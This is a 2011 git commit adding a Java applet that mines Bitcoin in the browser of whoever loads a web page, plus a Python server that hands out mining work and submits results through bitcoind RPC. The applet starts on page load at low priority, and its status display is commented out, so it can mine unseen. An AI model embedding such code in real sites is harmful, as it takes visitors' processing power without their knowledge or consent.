da4bd39531a5572bed4289743a516d74e85619df
Zephyre <jzephyre@gmail.com>
2011-06-02 22:44:21 -0700

    first commit

---
+++ BitJAM.java
@@ -0,0 +1,133 @@
+import java.util.Random;
+import java.applet.*;
+import java.awt.*;
+import java.awt.event.*;
+import java.io.*;
+import java.net.*;
+import java.nio.ByteBuffer;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+
+public class BitJAM extends Applet implements Runnable {
+    Thread thread;
+    boolean running = true;
+    PrintWriter pf;
+    BufferedReader is;
+    int nonce = 0;
+    Socket s = null;
+    
+    long lastgot_time = 0;
+    long meter_time = System.currentTimeMillis();
+    long meter_hash = 0;
+    
+    final int[] data = new int[32];
+    final long[] target = new long[8];
+    MessageDigest digestInside;
+    MessageDigest digestOutside;
+    final ByteBuffer digestInput = ByteBuffer.allocate(80);
+    byte[] digestOutput;
+
+	public void init() {
+	Random rng = new Random();
+        // initialize to some random value
+	nonce = rng.nextInt();
+        try {
+            digestInside  = MessageDigest.getInstance("SHA-256");
+            digestOutside = MessageDigest.getInstance("SHA-256");
+        } catch (NoSuchAlgorithmException e) {}
+        thread = new Thread(this);
+        thread.setPriority(Thread.MIN_PRIORITY);
+        thread.start();
+	}
+    
+    public void destroy() {
+        running = false;
+        thread = null;
+    }
+    
+    public void run(){
+        while(true) {
+
+        String response = null;
+        String ds;
+        String ts;
+        while(s == null){
+            try {
+                s = new Socket(getCodeBase().getHost(), 15063);
+                pf = new PrintWriter(s.getOutputStream(), true);
+                is = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                pf.println(getDocumentBase());
+            } catch (IOException e) {try{thread.sleep(1000);}catch(InterruptedException ee){}}
+        }
+        while (response == null){
+            try{
+                while (!is.ready()) {}
+                response = is.readLine(); // read in
+                lastgot_time = System.currentTimeMillis();
+                ds = response.substring(0,256);
+                ts = response.substring(256,256+64);
+                for(int i = 0; i < 32; i++) {
+                    data[i] = Integer.reverseBytes((int)Long.parseLong(ds.substring(i*8, (i*8)+8), 16));
+                    if (i < 19){
+                        digestInput.putInt(i*4, data[i]);
+                        if (i < 8) {target[i] = (Long.reverseBytes(Long.parseLong(ts.substring(i*8, (i*8)+8), 16) << 16)) >>> 16;}
+                    }
+                }
+            }catch(IOException e){}
+        }
+        while (System.currentTimeMillis() - lastgot_time < 30000) {
+            if (nonce >= 2147483647){nonce = -2147483648;}
+            else {nonce++;}
+
+            digestInput.putInt(76, nonce);
+            digestOutput = digestOutside.digest(digestInside.digest(digestInput.array()));
+            if(digestOutput[28] == 0 && digestOutput[29] == 0 && digestOutput[30] == 0 && digestOutput[31] == 0){
+                for(int bi=6; bi >= 0; bi--){
+                    long X = ((long)(0xFF & digestOutput[bi+3]) << 24) | ((long)(0xFF & digestOutput[bi+2]) << 16) | ((long)(0xFF & digestOutput[bi+1]) << 8) | ((long)(0xFF & digestOutput[bi]));
+                    if (X < target[bi]){ // lower than target
+                        pf.println(Integer.toHexString(nonce));
+                        bi = -1; // kill the loop
+                    }
+                    else if (X > target[bi]){ // higher than target
+                        bi = -1; // kill the loop
+                    }
+                    // loop continues if values were equal
+                }
+            }
+            /*
+            if(System.currentTimeMillis() >= meter_time + 1000 ){
+                showStatus(
+                    Long.toString((nonce-meter_hash))+
+                    " hashes per second. Current nonce: "+
+                    Integer.toString(nonce));
+                meter_hash = nonce;
+                meter_time = System.currentTimeMillis();
+            }*/
+            if((nonce & 65535) == 0){
+                try{
+                    if (is.ready()) {
+                        while (is.ready()){ // we only need the recent stuff
+                            response = is.readLine(); // read in from socket
+                            lastgot_time = System.currentTimeMillis();
+                            }
+                        ds = response.substring(0,256);
+                        ts = response.substring(256,256+64);
+                        for(int i = 0; i < 32; i++) {
+                            data[i] = Integer.reverseBytes((int)Long.parseLong(ds.substring(i*8, (i*8)+8), 16));
+                            if (i < 19) {
+                                 digestInput.putInt(i*4, data[i]);
+                                 if (i < 8){target[i] = (Long.reverseBytes(Long.parseLong(ts.substring(i*8, (i*8)+8), 16) << 16)) >>> 16;}
+                            }
+                        }
+                    }
+                }catch(IOException e){}
+            }
+        }
+        //showStatus("Connection dropped, attempting to reconnect...");
+        try{s.close();}catch (IOException e) {}
+        s = null;
+        // sleep a few seconds and try again.
+        try{thread.sleep(5000);}catch(InterruptedException e){}
+    }
+    }
+}
---
+++ bitjamserver.py
@@ -0,0 +1,361 @@
+#!/usr/bin/python
+
+import hashlib
+import struct
+import socket
+import threading
+from base64 import b64encode
+import base64
+import httplib
+import json
+import time
+import sys
+
+settings = {
+    'host':'',
+    'port':8332,
+    'rpcuser':'',
+    'rpcpass':''
+}
+
+if not sys.argv[1:]:
+    print 'arguments are required:'
+    print '-u username --pass pwd -o host -p port'
+    exit()
+
+mode = None
+bad_args = False
+for arg in sys.argv[1:]:
+    if arg in ('-u', '-p', '--pass', '-o'):
+        mode = arg
+    elif mode:
+        if mode == '-u':
+            settings['rpcuser'] = arg
+        if mode == '-p':
+            settings['port'] = arg
+        if mode == '--pass':
+            settings['rpcpass'] = arg
+        if mode == '-o':
+            settings['host'] = arg
+        mode = None
+    else:
+        bad_args = True
+
+if bad_args:
+    print 'arguments are possibly invalid. starting up anyway'
+
+del mode
+
+
+
+clients = []
+
+
+
+class Printer(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.done = False
+        self.line = []
+        self.start()
+    def say(self, *what):
+        self.line.append(' '.join([str(s) for s in what]))
+        while self.line:
+            time.sleep(0.01)
+    def run(self):
+        while not self.done:
+            time.sleep(0.01)
+            while self.line:
+                print self.line.pop(0)
+printer = Printer()
+
+
+class ClientListener(threading.Thread):
+    def __init__(self, host='', port=15063):
+        self.timeout = 5
+        self.host = host
+        self.port = port
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.new_clients = []
+        self.done = False
+        threading.Thread.__init__(self)
+    
+    def get_new_clients(self):
+        nc, self.new_clients = self.new_clients, []
+        return nc
+    
+    def stop(self):
+        self.done = True
+    
+    def run(self):
+        try:
+            s = self.s
+            s.bind((self.host,self.port))
+            printer.say('initializing client listener')
+            while not self.done:
+                s.settimeout(self.timeout)
+                timeout = False
+                try:
+                    s.listen(1)
+                    conn, addr = s.accept()
+                except socket.timeout:
+                    timeout = True
+                if not timeout:
+                    printer.say( 'new client!', addr)
+                    conn.setblocking(0)
+                    self.new_clients.append((conn,addr))
+        except:
+            self.done = True
+            s.close()
+            raise
+
+class WorkManager(threading.Thread):
+    def __init__(self):
+        self.need_update = False
+        self.manage_delay = 0.5
+        self.cur_work = None
+        self.clients = []
+        self.got = []
+        cl = self.client_listener = ClientListener()
+        cl.start()
+        self.done = False
+        threading.Thread.__init__(self)
+    
+    def set_work(self, data, target):
+        if data + target != self.cur_work:
+            self.cur_work = data + target
+            self.work_data = data
+            self.work_target = target
+            self.need_update = True
+    
+    def send_work(self, client):
+        try:
+            if self.cur_work is not None:
+                client[0].send(self.cur_work+'\n')
+                if client[2] == 'init':
+                    client[2] == 'work sent'
+        except socket.error, e:
+            if e.errno == 11: # socket isn't ready
+                pass
+            elif e.errno in (32, 104):
+                printer.say('removing client',client[1])
+                self.clients.remove(client)
+            else:
+                printer.say('strange error while trying to send work')
+                raise
+    
+    def init_client(self, client):
+        c = client
+        if len(c) < 4:
+            c = [c[0], c[1], 'init', '', '']
+        else:
+            c[2] == 'init'
+        self.send_work(c)
+        return c
+    
+    def run(self):
+        try:
+            printer.say('initializing work manager')
+            while not self.done:
+                time.sleep(self.manage_delay)
+                if self.client_listener.done:
+                    self.done = True
+                
+                # initialize new clients
+                cl = self.client_listener
+                cl_nc = cl.new_clients
+                if cl_nc:
+                    nc = cl.get_new_clients()
+                    for c in nc:
+                        c = self.init_client(c)
+                        self.clients.append(c)
+                
+                # see if there's anything new
+                for c in self.clients[:]:
+                    try:
+                        got = c[0].recv(1024)
+                        if got:
+                            printer.say('GOT SOMETHING!',repr(got))
+                            c[3] = c[3] + got
+                        csplit = c[3].split('\n')
+                        for piece in csplit[:-1]:
+                            if len(piece) == 8:
+                                # it's (probably) a nonce! :O
+                                ishex = True
+                                for c in piece:
+                                    if c not in '0123456789abcdefABCDEF':
+                                        ishex = False
+                                        break
+                                if ishex:
+                                    self.got.append(struct.unpack('<I', piece.decode('hex'))[0])
+                            elif piece.startswith('http://'):
+                                # this could be used to differentiate
+                                # between different accounts, if you
+                                # made this into an embeddable service thing
+                                c[4] = piece
+                            else:
+                                # probably unsupported features or somebody sending random data trying to break stuff
+                                printer.say('...but the thing I got is weird!')
+                        # stuff the end back in in case we got a partial message
+                        c[3] = csplit[-1]
+                    except socket.error, e:
+                        if e.errno == 11: # socket isn't ready
+                            pass
+                        elif e.errno in (32,104): # client left
+                            printer.say('removing client',c[1])
+                            self.clients.remove(c)
+                        else: # a strange and mysterious occurence
+                            printer.say('client socket error')
+                            raise
+                
+                # send out new work if there is any
+                if self.need_update:
+                    self.need_update = False
+                    for c in self.clients[:]:
+                        self.send_work(c)
+            self.client_listener.stop()
+            self.done = True
+        except:
+            # shutdown the client listener first so we can go down cleanly
+            self.done = True
+            self.client_listener.stop()
+            raise
+
+
+def bytereverse(x):
+    return 0xffffffffL & (( ((x) << 24) | (((x) << 8) & 0x00ff0000) | (((x) >> 8) & 0x0000ff00) | ((x) >> 24) ))
+def bufreverse(in_buf):
+    out_words = []
+    for i in range(0, len(in_buf), 4):
+        word = struct.unpack('@I', in_buf[i:i+4])[0]
+        out_words.append(struct.pack('@I', bytereverse(word)))
+    return ''.join(out_words)
+def wordreverse(in_buf):
+    out_words = []
+    for i in range(0, len(in_buf), 4):
+        out_words.append(in_buf[i:i+4])
+    out_words.reverse()
+    return ''.join(out_words)
+
+
+class BitcoinRPC(object):
+    OID = 1
+    def __init__(self, host, port, username, password):
+        authpair = "%s:%s" % (username, password)
+        self.authhdr = "Basic %s" % (base64.b64encode(authpair))
+        self.conn = httplib.HTTPConnection(host, port, False, 30)
+        printer.say('initializing rpc')
+    
+    def rpc(self, method, params=None):
+        headers = {'Authorization':self.authhdr,'Content-type':'application/json'}
+        self.OID += 1
+        obj = {'version':'1.1','method':method,'id':self.OID}
+        obj['params'] = ((params is None) and ([],) or (params,))[0]
+        self.conn.request('POST','/',json.dumps(obj),headers)
+        badresp = False
+        try:
+            resp = self.conn.getresponse()
+        except:
+            badresp = True
+        if badresp:
+            printer.say('rpc got a bad response')
+            return None
+        if resp is None:
+            printer.say('no response from rpc')
+            return None
+
+        if resp.status == httplib.UNAUTHORIZED: raise NotAuthorized()
+
+        # something strange happened. it is a mystery within an enigma
+        if str(resp.status) != '200':
+            printer.say('weird response status:',resp.status)
+
+        rjson = json.loads(resp.read())
+        if rjson is None or 'result' not in rjson:
+            printer.say("rpc's response was invalid")
+            return None
+        if 'error' in rjson and rjson['error'] is not None:
+            printer.say('some sort of rpc error occurred...')
+            return rjson['error']
+        return rjson['result']
+    
+    def getwork(self, data=None):
+        return self.rpc('getwork', data)
+
+
+class Miner(object):
+    def __init__(self):
+        self.rpc = None
+        self.done = False
+        # a higher value might better here...?
+        # anything older than the number of seconds
+        # here is considered invalid/stale
+        self.manage_interval = 5
+        self.work_manager = WorkManager()
+        self.work_manager.start()
+
+    def check_work(self, datastr, targetstr, nonce):
+        target = long(targetstr.decode('hex')[::-1].encode('hex'), 16)
+        nonce_bin = struct.pack('<I', nonce)
+        hash = hashlib.sha256()
+        hash.update(bufreverse(datastr.decode('hex'))[:76])
+        hash.update(nonce_bin)
+        hash_o = hashlib.sha256()
+        hash_o.update(hash.digest())
+        hash = hash_o.digest()
+        # do the basic 0x00000000 ending test
+        if not hash.endswith('\x00\x00\x00\x00'):
+            return False, nonce_bin
+        return long(wordreverse(bufreverse(hash)).encode('hex'), 16) < target, nonce_bin
+
+    def submit_work(self, rpc, original_data, nonce_bin):
+        result = rpc.getwork([original_data[:152] + bufreverse(nonce_bin).encode('hex') + original_data[160:256]])
+        printer.say("result accepted?", repr(result))
+
+    def dowork(self):
+        rpc = self.rpc
+        if self.work_manager.done:
+            self.done = True
+            return
+
+        got = []
+        if self.work_manager.got:
+            got, self.work_manager.got = self.work_manager.got, []
+            wdata = self.work_manager.work_data
+            wtarget = self.work_manager.work_target
+        
+        for nonce in got:
+            is_good, nonce_bin = self.check_work(wdata,wtarget, nonce)
+            if is_good:
+                printer.say('sending good data')
+                self.submit_work(rpc, wdata, nonce_bin)
+            else:
+                printer.say('data was bad')
+        
+        work = rpc.getwork()
+        if work is None or 'data' not in work or 'target' not in work:
+            return
+        
+        self.work_manager.set_work(work['data'], work['target'])
+
+    def loop(self):
+        self.rpc = BitcoinRPC(settings['host'],settings['port'],settings['rpcuser'],settings['rpcpass'])
+        while not self.done:
+            time.sleep(self.manage_interval)
+            self.dowork()
+
+
+
+try:
+    printer.say('Starting up. Use ctrl+c to exit.')
+    miner = Miner()
+    miner.loop()
+except KeyboardInterrupt:
+    pass
+except:
+    miner.work_manager.done = True
+    printer.done = True
+    raise
+
+miner.work_manager.done = True
+printer.done = True
